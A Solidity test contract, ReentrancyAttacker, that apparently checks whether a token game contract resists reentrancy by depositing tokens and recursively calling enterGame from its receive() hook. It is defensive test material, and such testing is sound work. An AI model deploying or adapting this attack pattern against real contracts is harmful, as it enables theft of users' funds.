// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

/**
 * @title ReentrancyAttacker
 * @dev A malicious contract that attempts to exploit reentrancy vulnerabilities
 */
interface ITetriSeedGame {
    function depositTokens(uint256 amount) external;
    function enterGame() external;
    function getPlayerBalance(address player) external view returns (uint256);
}

contract ReentrancyAttacker {
    using SafeERC20 for IERC20;
    
    IERC20 public token;
    ITetriSeedGame public gameContract;
    address public owner;
    bool public attacking;
    uint256 public attackCount;
    
    event AttackExecuted(bool success);
    event TokensReceived(uint256 amount);
    event RecursiveCallAttempted(uint256 count);
    
    constructor(address _token, address _gameContract) {
        token = IERC20(_token);
        gameContract = ITetriSeedGame(_gameContract);
        owner = msg.sender;
        attacking = false;
        attackCount = 0;
    }
    
    function attack(uint256 amount) external {
        // Allow anyone to call the attack function for testing purposes
        require(token.balanceOf(address(this)) >= amount, "Not enough tokens");
        
        // Approve tokens for the game contract
        token.approve(address(gameContract), amount);
        
        // Set attacking flag
        attacking = true;
        attackCount = 0;
        
        // Deposit tokens to the game contract
        gameContract.depositTokens(amount);
        
        // Try to enter the game, which should trigger reentrancy if vulnerable
        try gameContract.enterGame() {
            // If this succeeds, continue the attack
        } catch {
            emit AttackExecuted(false);
        }
        
        // Reset attacking flag
        attacking = false;
        emit AttackExecuted(true);
    }
    
    // This fallback function will be called during token transfers
    // if the contract is vulnerable to reentrancy
    receive() external payable {
        // If we're in attack mode, try to reenter
        if (attacking) {
            emit RecursiveCallAttempted(++attackCount);
            
            if (attackCount < 3) { // Limit to prevent out-of-gas errors
                // Try to enter the game as well
                try gameContract.enterGame() {} catch {}
            }
        }
    }
    
    // Function to fund the attacker contract
    function fundAttacker(uint256 amount) external {
        token.safeTransferFrom(msg.sender, address(this), amount);
    }
    
    // Function to withdraw tokens from the attacker contract
    function withdrawTokens() external {
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.safeTransfer(msg.sender, balance);
        }
    }
} 